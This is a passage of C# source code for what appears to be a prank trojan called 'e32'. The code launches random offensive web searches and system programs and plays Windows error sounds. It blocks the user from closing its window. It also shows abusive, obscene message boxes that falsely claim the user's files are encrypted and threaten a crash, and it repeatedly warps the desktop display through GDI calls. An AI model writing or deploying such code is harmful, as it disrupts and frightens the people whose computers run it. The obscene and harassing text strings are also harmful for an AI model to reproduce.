               "https://www.google.co.ck/search?q=How+to+use+regedit&ei=LUJ0YurCNPLz1sQPmsmCmA4&ved=0ahUKEwiqjcG2p8n3AhXyuZUCHZqkAOMQ4dUDCA4&uact=5&oq=How+to+use+regedit&gs_lcp=Cgdnd3Mtd2l6EAMyBAgAEBMyBAgAEBMyBAgAEBMyBAgAEBMyBAgAEBMyBAgAEBMyBAgAEBMyCAgAEBYQHhATMggIABAWEB4QEzIICAAQFhAeEBM6CwgAEIAEELEDEIMBOggIABCABBCxAzoICAAQsQMQgwE6BQgAEIAEOhEILhCABBCxAxCDARDHARCjAjoLCC4QsQMQgwEQ1AI6DgguEIAEELEDEMcBEKMCOgQIABBDOgsILhCABBCxAxCDAToOCC4QgAQQsQMQgwEQ1AI6BQguEIAEOggILhCABBDUAjoICC4QsQMQ1AI6BAgAEAM6BQgAELEDOgQIABANOgYIABAWEB46CQgAEMkDEBYQHjoICAAQFhAKEB46CAgAEA0QHhATSgQIQRgASgQIRhgAUMUHWPTEAWC4yAFoFXABeAOAAcQBiAGoJJIBBTE5LjI0mAEAoAEBsAEAwAEB&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=il2cpp+hacking&ei=V0J0Yv7VKLTd1sQPwLqu0Ag&oq=il2cpp+&gs_lcp=Cgdnd3Mtd2l6EAMYBTIHCAAQgAQQCjIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBAgAEB4yBggAEAoQHjoUCAAQ6gIQtAIQigMQtwMQ1AMQ5QI6EQgAEOoCELQCEIoDELcDEOUCOgsIABCABBCxAxCDAToRCC4QgAQQsQMQgwEQxwEQ0QM6CwguELEDEIMBENQCOhEILhCABBCxAxCDARDHARCjAjoICAAQsQMQgwE6DgguEIAEELEDEMcBENEDOgsILhCABBCxAxCDAToICC4QgAQQsQM6BAgAEEM6CwguEIAEELEDENQCOggIABCABBCxAzoFCC4QgAQ6CAguEIAEENQCOgcILhCABBAKSgQIQRgASgQIRhgAUPk3WJNEYNxmaAFwAXgAgAGKAYgBkQaSAQMwLjeYAQCgAQGwAQrAAQE&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=league+of+legends+hack+terbaru+download&ei=pkJ0YoWGNrHb1sQPw9O1kAI&oq=league+of+legends+hack+terbaru+down&gs_lcp=Cgdnd3Mtd2l6EAMYADIFCCEQoAEyBQghEKABMgUIIRCgATIFCCEQoAE6BAgAEEc6CAgAEIAEELEDOggILhCABBCxAzoHCAAQsQMQQzoFCAAQgAQ6BggAEBYQHjoECAAQEzoICAAQFhAeEBM6BAghEBU6BwghEAoQoAFKBAhBGABKBAhGGABQgQFYpShgjy9oAXACeACAAd8CiAGZFZIBCDAuMTguMC4xmAEAoAEByAEIwAEB&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=%D9%83%D9%8A%D9%81+%D8%AA%D9%85%D8%AA%D8%B5+%D8%AF%D9%8A%D9%83&source=lmns&bih=657&biw=1366&hl=pt-BR&sa=X&ved=2ahUKEwj3ibqcqMn3AhUDHN8KHRZ5CgoQ_AUoAHoECAEQAA",
               "https://www.google.co.ck/search?q=elon+musk+twitter&ei=AUN0YvbIE4jp_QbE6aXwCQ&oq=elon+musk&gs_lcp=Cgdnd3Mtd2l6EAMYATILCC4QgAQQsQMQgwEyCwgAEIAEELEDEIMBMgsIABCABBCxAxCDATIICAAQsQMQgwEyCAgAELEDEIMBMgsIABCABBCxAxCDATILCAAQgAQQsQMQgwEyCwgAEIAEELEDEIMBMgsIABCABBCxAxCDATIECAAQAzoRCC4QgAQQsQMQgwEQxwEQowI6BQgAEIAEOgUILhCABDoOCC4QgAQQsQMQgwEQ1AI6BAgAEEM6BwguENQCEEM6EQguEIAEELEDEIMBEMcBENEDOggIABCABBCxAzoOCC4QgAQQsQMQxwEQowI6CgguELEDEIMBEEM6FAguEIAEELEDEIMBEMcBENEDENQCOg0ILhCABBCxAxCDARAKOgcIABCABBAKSgQIQRgASgQIRhgAUPg6WLxRYMJcaAJwAHgAgAGHAogB_w-SAQUwLjYuNJgBAKABAbABAMABAQ&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=how+to+destroy+a+pussy&ei=JkN0YqXRGeeZ_QbB7aOYAg&ved=0ahUKEwil_IOtqMn3AhXnTN8KHcH2CCMQ4dUDCA4&uact=5&oq=how+to+destroy+a+pussy&gs_lcp=Cgdnd3Mtd2l6EAM6EAguEMcBEKMCEOoCELQCEEM6CggAEOoCELQCEEM6CgguEOoCELQCEEM6EAguEMcBENEDEOoCELQCEEM6DgguEIAEELEDEMcBEKMCOgsIABCABBCxAxCDAToOCC4QgAQQxwEQowIQ1AI6CAgAEIAEELEDOggIABCxAxCDAToFCAAQgAQ6EQguEIAEELEDEIMBEMcBEKMCOg0ILhDHARCjAhDUAhBDOg4ILhCABBCxAxCDARDUAjoFCC4QgAQ6CAguEIAEENQCOggILhCxAxDUAjoECAAQAzoFCAAQsQM6CwguEIAEELEDEIMBOgcIABCABBAKOgYIABAWEB46CAgAEBYQChAeOgQIABATOggIABAWEB4QE0oECEEYAEoECEYYAFC0BViKKWDQMmgBcAF4AIABzgGIAYsekgEGMC4yMS4xmAEAoAEBsAEKwAEB&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=bluezao+picture&ei=bUN0YvL8Cuiigge0qZG4Dw&ved=0ahUKEwiy5-LOqMn3AhVokeAKHbRUBPcQ4dUDCA4&uact=5&oq=bluezao+picture&gs_lcp=Cgdnd3Mtd2l6EAMyBQghEKABOgUIABCABDoICC4QgAQQ1AI6BQguEIAEOgYIABAWEB46BwghEAoQoAFKBAhBGAFKBAhGGABQqQVY5CpgyCxoBXAAeACAAYsCiAGqEpIBBTAuNy41mAEAoAEBwAEB&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=shrek+movie+script&source=lmns&bih=657&biw=1366&hl=pt-BR&sa=X&ved=2ahUKEwiHuP7sqMn3AhUMQkIHHYT2BLoQ_AUoAHoECAEQAA",
               "https://www.google.co.ck/search?q=is+whatsapp+2+real&tbm=isch&ved=2ahUKEwjlwde3qcn3AhWBmVMKHcbuDlEQ2-cCegQIABAA&oq=is+whatsapp+2+real&gs_lcp=CgNpbWcQAzoECAAQQzoICAAQgAQQsQM6BQgAEIAEOggIABCxAxCDAToHCAAQsQMQQzoECAAQHjoECAAQE1D_BliMPGCzPmgCcAB4AIAB1gGIAdsekgEGMC4xOS4ymAEAoAEBqgELZ3dzLXdpei1pbWfAAQE&sclient=img&ei=SUR0YqX5C4GzzgLG3buIBQ&bih=657&biw=1366&hl=pt-BR",
               "https://www.google.co.ck/search?q=muzmo&source=lmns&bih=657&biw=1366&hl=pt-BR&sa=X&ved=2ahUKEwis3sbUqcn3AhVcQkIHHZZhCvYQ_AUoAHoECAEQAA",
               "https://www.google.co.ck/search?q=Free+porn+download+2022&source=hp&ei=NUV0YsmSEMvh1sQP_aa5kAo&iflsig=AJiK0e8AAAAAYnRTRVzQXPXd60XvZ1kgt_O5ywsw2Rj0&ved=0ahUKEwiJgaCoqsn3AhXLsJUCHX1TDqIQ4dUDCAc&uact=5&oq=Free+porn+download+2022&gs_lcp=Cgdnd3Mtd2l6EAM6EQguEIAEELEDEIMBEMcBENEDOgsILhCABBCxAxCDAToLCAAQgAQQsQMQgwE6CAguELEDEIMBOggIABCxAxCDAToFCAAQgAQ6CAgAEIAEELEDOgQIABADOgsILhCABBCxAxDUAjoOCAAQgAQQsQMQgwEQyQM6BQgAEJIDOggILhCABBCxAzoICC4QgAQQ1AI6DQguEIAEEMcBENEDEAo6CggAEIAEELEDEAo6BwgAEIAEEAo6CwguEIAEEMcBEK8BOgcILhCABBAKUIULWNovYOEyaAFwAHgAgAGOAYgB6RKSAQUxMC4xM5gBAKABAbABAA&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=nuclear+bomb+price&ei=sVFwYr32CMj41sQPtvCn4AI&ved=0ahUKEwj9kpXU5cH3AhVIvJUCHTb4CSwQ4dUDCA4&uact=5&oq=nuclear+bomb+price&gs_lcp=Cgdnd3Mtd2l6EAMyCAgAEBYQHhATOhAILhCxAxCDARDHARDRAxBDOg4ILhCABBCxAxDHARCjAjoLCAAQgAQQsQMQgwE6CAguELEDEIMBOggIABCxAxCDAToLCC4QgAQQsQMQgwE6DgguEIAEELEDEMcBENEDOgsILhCABBDHARDRAzoLCC4QsQMQgwEQ1AI6EQguEIAEELEDEIMBEMcBENEDOgQIABBDOggIABCABBCxAzoMCC4QxwEQrwEQChBDOgsIABCxAxCDARDJAzoFCC4QgAQ6BQgAEIAEOgsILhCxAxDHARCvAToRCC4QgAQQsQMQgwEQxwEQrwE6CwguEIAEEMcBEK8BOgoIABAWEAoQHhATSgQIQRgASgQIRhgAUIkGWOArYLMvaAJwAHgAgAHOAYgBsRGSAQY1LjEzLjGYAQCgAQGwAQDAAQE&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=how+to+get+followers+on+instagram+fast&source=lnms&tbm=vid&sa=X&ved=2ahUKEwjV0_XKqsn3AhWCjZUCHXj2C7YQ_AUoAXoECAgQAw&biw=1366&bih=657&dpr=1",
               "https://www.google.co.ck/search?q=how+to+destroy+windows+10+using+cmd&biw=1366&bih=657&ei=tkV0YpPsAcnx1sQP6qCgoAE&oq=how+to+destroy+windows&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQARgDMgcIABBHELADMgcIABBHELADMgcIABBHELADMgcIABBHELADMgcIABBHELADMgcIABBHELADMgcIABBHELADMgcIABBHELADSgQIQRgASgQIRhgAUABYAGDtDWgBcAF4AIABAIgBAJIBAJgBAMgBCMABAQ&sclient=gws-wiz-serp",
               "https://www.google.co.ck/search?q=joel+vargskelethor&biw=1366&bih=657&ei=vkV0Yq7EK7PN1sQPtI6L8Ao&oq=joel+varg&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAxgAMgUIABCABDIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjoRCAAQ6gIQtAIQigMQtwMQ5QI6CwgAEIAEELEDEIMBOgUILhCABDoICC4QsQMQgwE6CAgAELEDEIMBOgQIABBDOgcILhCxAxBDOgQILhBDOgcILhDUAhBDOgsILhCABBCxAxDUAjoLCC4QgAQQsQMQgwE6CAgAEIAEELEDOggILhCABBCxAzoKCC4QsQMQ1AIQQzoKCC4QsQMQgwEQQzoLCC4QgAQQxwEQrwFKBAhBGABKBAhGGABQiTBY1UBgqkhoAXABeACAAY4BiAGlCJIBAzAuOZgBAKABAbABBcABAQ&sclient=gws-wiz-serp",
               "https://www.google.co.ck/search?q=pornhub+app+download&biw=1366&bih=657&ei=W0d0YunRHvaJ1sQP-PKA-As&ved=0ahUKEwip68-urMn3AhX2hJUCHXg5AL8Q4dUDCA4&uact=5&oq=pornhub+app+download&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzoKCAAQ6gIQtAIQQzoUCAAQ6gIQtAIQigMQtwMQ1AMQ5QI6CwgAEIAEELEDEIMBOggILhCABBCxAzoLCC4QgAQQxwEQowI6CAgAELEDEIMBOggILhCxAxCDAToICAAQgAQQsQM6DgguEIAEELEDEMcBEKMCOgUIABCABDoFCC4QgAQ6CwguEIAEELEDENQCSgQIQRgASgQIRhgAUNUPWJOWAWDglwFoFnABeAGAAaECiAGZHpIBBzI1LjEyLjGYAQCgAQGwAQrAAQE&sclient=gws-wiz-serp",
               "https://youareanidiot.cc",
               "https://nsa.gov",
               "msconfig.exe",
               "cmd.exe",
               "calc.exe",
               "write.exe"
            };
            int lengthtest = r.Next(Links.Length);
            string LinkSelected = Links[lengthtest];
            Process.Start(LinkSelected);
        }

        private void StartSoundsPlayload_Tick(object sender, EventArgs e)
        {
            StartSoundsPlayload.Stop();
            int soundid = rtest.Next(3);
            if (soundid == 1)
            {
                soundp.Play();
            }
            if (soundid == 2)
            {
                soundp2.Play();
            }
            if (soundid == 3)
            {
                soundp3.Play();
            }
            StartSoundsPlayload.Start();
        }

        Random rtest = new Random();
        private void LoadSounds()
        {
            try
            {
                if (File.Exists(sound_file))
                {
                    soundp = new SoundPlayer(@"C:\Windows\Media\Windows Background.wav");
                }
                if (File.Exists(sound_file3))
                {
                    soundp3 = new SoundPlayer(@"C:\Windows\Media\Windows Foreground.wav");
                }
                if (File.Exists(sound_file2))
                {
                    soundp2 = new SoundPlayer(@"C:\Windows\Media\Windows Critical Stop.wav");
                }
            }
            catch
            {
                return;
            }
        }

        string sound_file2 = @"C:\Windows\Media\Windows Critical Stop.wav";
        string sound_file = @"C:\Windows\Media\Windows Background.wav";
        string sound_file3 = @"C:\Windows\Media\Windows Foreground.wav";

        private SoundPlayer soundp;

        private SoundPlayer soundp2;

        private SoundPlayer soundp3;

        private void InitPayloads_FormClosing(object sender, FormClosingEventArgs e)
        {
            IFUKILLPROCESS.Start();
            e.Cancel = true;
        }

        private void IFUKILLPROCESS_Tick(object sender, EventArgs e)
        {
            string[] arrayhere = new string[]
            {
               "MOMMA",
               "HMMMMMM...",
               "LOVE UR MOMMA OK?",
               "I'm encrypting ur files xdxdxdxd",
               "JOHN CENAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
               "PUTIN.EXE LMAO",
               "e32 loves u",
               "I LOVE UR DATA",
               "I LOVE THE INTERNET LMAO",
               "e32 loves ur pc",
               "UR MOMMA SAYS PUTIN HAS A SMALL DICK",
               "THE WINDOWS HATE COCKS",
               ":)",
               ":(",
               ">:)",
               "Your machine is nice LMAOLMAO",
               "JOEL DOESN'T LIKE FOODS WITH BALLS",
               "WINDOWS DEFENDER DOESN'T LIKE ME :(, IT DETECTS ME",
               "DO U WANNA CRY?",
               "I WANT UR MOM OK??",
               "HUMMMMMM, DO U HATE UR DAD??????????????????????",
               "HELLO IT'S ME, MARIO",
               "GAY",
               "DICK HEAD LMAO",
               "PUSSY",
               "YOU KILLED MY TROJAN",
               "FUCKED BY E32",
               "ENJOY THE BSOD",
               "ENJOY THE BSOD LMAO",
               "GO FUCK YOUR SELF",
               "E32",
               "e32",
               "WHY DID U KILL THE PROCESS????????????, IDIOT",
               "YOU ARE AN IDIOT HAHAHAHA",
               "I WILL EAT UR MOMMA",
               "GIVE UP",
               "ENJOY THE DEATH NOW",
               "FUCK YOU",
               "ENJOY THE FUCKIN' BOOT FATAL ERROR",
               "ahahhaahahah",
               "GET THE FUCK",
               "e32 wants or momma here",
               "HAHAHAHHAHAHHH FUCK YOU",
               "ALL YOUR FILES HAVE BEEN ENCRYPTED LMAO"
            };
            int textrandomtolabelk = r.Next(arrayhere.Length);
            string text = arrayhere[textrandomtolabelk];
            GDICrash();
            StartGDICrash.Start();
            MessageBox.Show(text, text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void GDICrash()
        {
            r = new Random();
            Random r9 = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, r9.Next(10), r9.Next(10), x - r9.Next(25), y - r9.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            IntPtr hwnd2 = GetDesktopWindow();
            IntPtr hdc2 = GetWindowDC(hwnd2);
            int x2 = Screen.PrimaryScreen.Bounds.Width;
            int y2 = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc2, r9.Next(10), r9.Next(10), x - r9.Next(25), y2 - r9.Next(25), hdc2, 0, 0, x2, y2, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc2, x2, 0, -x2, y2, hdc2, 0, 0, x2, y2, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc2, 0, y2, x2, -y2, hdc2, 0, 0, x2, y2, TernaryRasterOperations.SRCCOPY);
            IntPtr hwnd3 = GetDesktopWindow();
            IntPtr hdc3 = GetWindowDC(hwnd3);
            int x3 = Screen.PrimaryScreen.Bounds.Width;
            int y3 = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc3, r9.Next(10), r9.Next(10), x - r9.Next(25), y3 - r9.Next(25), hdc3, 0, 0, x3, y3, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc3, x3, 0, -x3, y3, hdc3, 0, 0, x3, y3, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc3, 0, y3, x3, -y, hdc3, 0, 0, x3, y3, TernaryRasterOperations.SRCCOPY);
        }

        private void StartGDICrash_Tick(object sender, EventArgs e)
        {
            GDICrash();
        }
    }
}
